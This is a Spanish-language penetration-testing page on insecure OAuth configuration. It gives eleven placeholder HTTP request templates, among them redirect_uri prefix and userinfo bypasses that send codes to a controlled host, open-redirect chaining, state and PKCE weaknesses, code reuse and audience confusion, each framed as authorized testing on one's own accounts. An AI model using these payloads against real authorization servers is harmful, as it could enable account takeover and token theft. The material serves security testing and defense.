# 🗡️ Configuración insegura de OAuth: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. redirect_uri fuera de la lista

**Objetivo:** Cambiar solo el destino del flujo propio por un host de prueba no registrado.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri=https%3A%2F%2F{CONTROLLED_HOST}%2Fcallback&state={STATE_PROPIO}&code_challenge={CHALLENGE_PROPIO}&code_challenge_method=S256 HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** El servidor debe rechazar la URI antes de emitir code; una página de error que refleja la URI no prueba fuga.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc9700).

### 2. Coincidencia por prefijo

**Objetivo:** Probar una URI cuyo inicio coincide con la registrada pero cuya autoridad es propia.

```text
redirect_uri=https://{HOST_REGISTRADO}.{CONTROLLED_HOST}/callback
redirect_uri=https://{HOST_REGISTRADO}@{CONTROLLED_HOST}/callback
```

**Interpretación:** Usar un dominio controlado y examinar Location final. Solo hay impacto si el code/token llega a un origen no autorizado.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md).

### 3. Open redirect en callback permitido

**Objetivo:** Comprobar si una URI registrada contiene un redirect propio que reenvía el code.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri=https%3A%2F%2F{HOST_REGISTRADO}%2Fredirect%3Fnext%3Dhttps%253A%252F%252F{CONTROLLED_HOST}%252Fcb&state={STATE_PROPIO} HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** La cadena requiere que la URI completa esté registrada y que el code sea canjeable; PKCE puede impedir el impacto.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/oauth).

### 4. Callback sin state

**Objetivo:** Visitar el callback propio sin un valor de estado vinculado a un flujo iniciado.

```http
GET /oauth/callback?code={CODE_PROPIO_DE_PRUEBA} HTTP/1.1
Host: {CLIENT_APP}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** La aplicación debe rechazarlo. Si enlaza otra cuenta, confirmar con dos cuentas propias y sin usar códigos ajenos.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/oauth).

### 5. State de otra transacción

**Objetivo:** Intercambiar estados de dos flujos propios sin mezclar identidades de terceros.

```text
Inicio A -> state={STATE_A}, code_challenge={CHALLENGE_A}
Inicio B -> state={STATE_B}, code_challenge={CHALLENGE_B}
Callback B con state={STATE_A} -> debe rechazarse
```

**Interpretación:** Demostrar rechazo/aceptación por transacción; una comparación textual de states no sustituye prueba de sesión resultante.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc9700).

### 6. PKCE ausente o degradado

**Objetivo:** En cliente público, comparar authorization request sin challenge y con método plain.

```http
GET /authorize?response_type=code&client_id={CLIENT_PUBLICO}&redirect_uri={REDIRECT_URI_REGISTRADA}&state={STATE_PROPIO}&code_challenge={VERIFIER_PROPIO}&code_challenge_method=plain HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** Repetir sin code_challenge por separado. El impacto exige comprobar si el code se canjea sin verifier S256.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc9700).

### 7. Código de autorización reutilizado

**Objetivo:** Canjear dos veces el mismo code de una cuenta propia.

```http
POST /token HTTP/1.1
Host: {AUTHORIZATION_SERVER}
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id={CLIENT_ID}&code={CODE_PROPIO_YA_CANJEADO}&redirect_uri={REDIRECT_URI_REGISTRADA}&code_verifier={VERIFIER_PROPIO}
```

**Interpretación:** El segundo canje debe fallar. El code es de un solo uso; no registrar tokens reales en evidencias.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md).

### 8. Confusión de emisor

**Objetivo:** En cliente con dos proveedores, comparar iss y estado antes de aceptar el callback.

```text
Flujo iniciado con {ISSUER_A} y state={STATE_A}
Callback observado con iss={ISSUER_B} y state={STATE_A}
Resultado esperado: rechazo antes de crear sesión
```

**Interpretación:** La prueba requiere dos emisores configurados en un entorno controlado; un cambio de URL por sí solo no prueba mix-up.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc9700).

### 9. Alcance ampliado en autorización

**Objetivo:** Pedir un scope que el cliente de prueba no tiene concedido y revisar el token emitido.

```http
GET /authorize?response_type=code&client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI_REGISTRADA}&state={STATE_PROPIO}&scope=openid%20{SCOPE_NO_CONCEDIDO}&code_challenge={CHALLENGE_PROPIO}&code_challenge_method=S256 HTTP/1.1
Host: {AUTHORIZATION_SERVER}
```

**Interpretación:** El scope debe ser denegado o sujeto a consentimiento/política. Un parámetro aceptado no prueba que el token tenga el permiso.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/oauth).

### 10. Código de otro client_id

**Objetivo:** Intentar canjear un code propio emitido para cliente A presentando client_id B.

```http
POST /token HTTP/1.1
Host: {AUTHORIZATION_SERVER}
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&client_id={CLIENT_B_PROPIO}&code={CODE_EMITIDO_PARA_CLIENT_A}&redirect_uri={REDIRECT_URI_A}&code_verifier={VERIFIER_A}
```

**Interpretación:** El token endpoint debe ligar code a client_id y redirect_uri de origen; usar solo clientes administrados en el laboratorio.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc9700).

### 11. Token para otra audiencia

**Objetivo:** Enviar a recurso B un access token propio cuyo aud corresponde únicamente a recurso A.

```http
GET /api/me HTTP/1.1
Host: {RECURSO_B}
Authorization: Bearer {ACCESS_TOKEN_PROPIO_AUD_A}
```

**Interpretación:** B debe rechazarlo aunque la firma sea válida. Verificar el aud real y que B no acepte el token por compartir emisor.

**Fuente técnica:** [documentación de la técnica](https://datatracker.ietf.org/doc/html/rfc9700).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
